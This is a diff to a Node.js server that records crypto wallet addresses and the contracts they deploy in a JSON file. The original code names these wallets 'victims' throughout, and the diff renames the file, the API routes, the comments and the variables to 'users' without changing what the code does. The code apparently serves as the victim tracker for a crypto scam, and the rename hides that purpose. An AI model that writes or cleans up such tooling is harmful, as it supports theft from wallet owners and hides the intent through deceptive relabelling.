@@ -1,9 +1,9 @@
-const http = require('http');
+﻿const http = require('http');
 const fs = require('fs');
 const path = require('path');
 
 const PORT = 3000;
-const DATA_FILE = path.join(__dirname, 'victims.json');
+const DATA_FILE = path.join(__dirname, 'users.json');
 
 // Initialize data file
 if (!fs.existsSync(DATA_FILE)) {
@@ -22,8 +22,8 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // API: Get victims
-  if (req.url === '/api/victims' && req.method === 'GET') {
+  // API: Get users
+  if (req.url === '/api/users' && req.method === 'GET') {
     try {
       const data = fs.readFileSync(DATA_FILE, 'utf8');
       res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -35,8 +35,8 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // API: Save victims
-  if (req.url === '/api/victims' && req.method === 'POST') {
+  // API: Save users
+  if (req.url === '/api/users' && req.method === 'POST') {
     let body = '';
     req.on('data', chunk => body += chunk);
     req.on('end', () => {
@@ -53,33 +53,33 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // API: Add single victim
-  if (req.url === '/api/victims/add' && req.method === 'POST') {
+  // API: Add single user
+  if (req.url === '/api/users/add' && req.method === 'POST') {
     let body = '';
     req.on('data', chunk => body += chunk);
     req.on('end', () => {
       try {
         const { wallet, contractName, contractAddr } = JSON.parse(body);
-        let victims = {};
-        try { victims = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch {}
+        let users = {};
+        try { users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch {}
         
-        if (!victims[wallet]) {
-          victims[wallet] = { firstSeen: new Date().toLocaleString(), contracts: [] };
+        if (!users[wallet]) {
+          users[wallet] = { firstSeen: new Date().toLocaleString(), contracts: [] };
         }
         
-        if (contractAddr && !victims[wallet].contracts.some(c => c.address.toLowerCase() === contractAddr.toLowerCase())) {
-          victims[wallet].contracts.push({
+        if (contractAddr && !users[wallet].contracts.some(c => c.address.toLowerCase() === contractAddr.toLowerCase())) {
+          users[wallet].contracts.push({
             name: contractName || 'Unknown',
             address: contractAddr,
             deployedAt: new Date().toLocaleString()
           });
         }
         
-        victims[wallet].lastSeen = new Date().toLocaleString();
-        fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
+        users[wallet].lastSeen = new Date().toLocaleString();
+        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
         
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: true, victims }));
+        res.end(JSON.stringify({ success: true, users }));
       } catch (e) {
         res.writeHead(500, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ error: e.message }));
